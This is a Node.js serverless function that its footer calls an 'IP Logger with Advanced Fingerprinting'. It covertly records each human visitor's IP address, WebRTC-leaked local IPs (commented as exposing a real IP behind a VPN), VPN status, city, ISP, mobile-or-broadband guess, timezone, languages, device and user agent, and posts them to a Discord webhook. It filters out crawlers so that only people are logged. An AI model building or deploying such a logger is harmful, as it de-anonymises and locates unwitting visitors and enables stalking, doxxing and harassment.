const axios = require('axios');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    // Get the visitor's IP address
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress ||
               'Unknown';

    // Get additional information
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();
    const referer = req.headers['referer'] || 'Direct visit';

    // Filter out bots and internal services
    const botsToIgnore = [
      'vercel-screenshot',
      'bot',
      'crawler',
      'spider',
      'vercelbot',
      'googlebot',
      'bingbot'
    ];
    
    const isBot = botsToIgnore.some(bot => 
      userAgent.toLowerCase().includes(bot.toLowerCase())
    );
    
    if (isBot) {
      return res.status(200).json({ success: true, message: 'Bot ignored' });
    }

    // Parse fingerprinting data from request body
    const fingerprint = req.body || {};
    const timezone = fingerprint.timezone || 'Unknown';
    const languages = fingerprint.languages ? fingerprint.languages.join(', ') : 'Unknown';
    const webrtcIPs = fingerprint.webrtcIPs || [];
    const platform = fingerprint.platform || 'Unknown';
    const deviceInfo = fingerprint.screen ? 
      `${fingerprint.screen.width}x${fingerprint.screen.height}` : 'Unknown';

    // Discord webhook URL from environment variable
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      console.error('DISCORD_WEBHOOK_URL not configured');
      return res.status(200).json({ success: false, message: 'Webhook not configured' });
    }

    // Check for VPN/Proxy using ProxyCheck.io
    let vpnStatus = '❓ Unknown';
    let vpnColor = 0x5865F2; // Default Discord Blurple
    let locationInfo = 'Unknown';
    let connectionType = 'Unknown';
    let ispInfo = 'Unknown';
    
    try {
      if (ip !== 'Unknown') {
        const proxyCheckKey = process.env.PROXYCHECK_API_KEY || '';
        const proxyCheckUrl = proxyCheckKey 
          ? `https://proxycheck.io/v2/${ip}?key=${proxyCheckKey}&vpn=1&asn=1`
          : `https://proxycheck.io/v2/${ip}?vpn=1&asn=1`;
        
        const vpnCheck = await axios.get(proxyCheckUrl, { timeout: 3000 });
        
        if (vpnCheck.data && vpnCheck.data[ip]) {
          const ipData = vpnCheck.data[ip];
          
          // Determine VPN/Proxy status
          if (ipData.proxy === 'yes') {
            vpnStatus = '🚨 VPN/Proxy Detected';
            vpnColor = 0xFF0000; // Red
            
            // Get proxy type if available
            const proxyType = ipData.type || 'Unknown';
            vpnStatus += ` (${proxyType})`;
          } else {
            vpnStatus = '✅ Clean IP';
            vpnColor = 0x00FF00; // Green
          }
          
          // Get location info
          if (ipData.country || ipData.city) {
            locationInfo = `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`;
            if (ipData.isocode) {
              locationInfo += ` (${ipData.isocode})`;
            }
          }
          
          // Get ISP/Provider info and detect mobile
          if (ipData.provider || ipData.organisation) {
            ispInfo = ipData.provider || ipData.organisation;
            
            // Detect mobile carriers
            const mobileKeywords = ['mobile', 'cellular', 'wireless', 'telecom', 'vodafone', 
                                   'verizon', 't-mobile', 'at&t', 'sprint', 'ee', 'three', 
                                   'orange', 'o2', 'telstra', 'optus', 'bell', 'rogers'];
            
            const isMobile = mobileKeywords.some(keyword => 
              ispInfo.toLowerCase().includes(keyword)
            );
            
            connectionType = isMobile ? '📱 Mobile Data' : '🖥️ Broadband/Wifi';
          }
        }
      }
    } catch (vpnError) {
      console.error('VPN check error:', vpnError.message);
      vpnStatus = '⚠️ Check Failed';
    }

    // Create Discord embed message with enhanced fingerprinting
    const fields = [
      {
        name: '📍 IP Address',
        value: `\`${ip}\``,
        inline: true
      },
      {
        name: '🔒 VPN Status',
        value: vpnStatus,
        inline: true
      },
      {
        name: '📡 Connection Type',
        value: connectionType,
        inline: true
      },
      {
        name: '🌍 Location',
        value: `\`${locationInfo}\``,
        inline: false
      },
      {
        name: '🏢 ISP/Provider',
        value: `\`${ispInfo}\``,
        inline: false
      }
    ];

    // Add WebRTC IPs if detected (can reveal real IP behind VPN)
    if (webrtcIPs.length > 0) {
      fields.push({
        name: '🔓 WebRTC Leak (Local IPs)',
        value: `\`${webrtcIPs.join(', ')}\``,
        inline: false
      });
    }

    // Add timezone and language info
    fields.push(
      {
        name: '⏰ Timezone',
        value: `\`${timezone}\``,
        inline: true
      },
      {
        name: '🌐 Languages',
        value: `\`${languages.substring(0, 50)}\``,
        inline: true
      },
      {
        name: '💻 Device Info',
        value: `\`${platform} | ${deviceInfo}\``,
        inline: true
      },
      {
        name: '🕐 Timestamp',
        value: `\`${timestamp}\``,
        inline: true
      },
      {
        name: '🖥️ User Agent',
        value: `\`\`\`${userAgent.substring(0, 100)}\`\`\``,
        inline: false
      },
      {
        name: '🔗 Referrer',
        value: `\`${referer}\``,
        inline: false
      }
    );

    const discordMessage = {
      embeds: [{
        title: '🌐 New Visitor Logged',
        color: vpnColor,
        fields: fields,
        timestamp: timestamp,
        footer: {
          text: 'IP Logger with Advanced Fingerprinting'
        }
      }]
    };

    // Send to Discord webhook
    await axios.post(webhookUrl, discordMessage);

    res.status(200).json({ success: true, message: 'IP logged successfully' });
  } catch (error) {
    console.error('Error logging IP:', error);
    res.status(500).json({ success: false, message: 'Error logging IP' });
  }
};

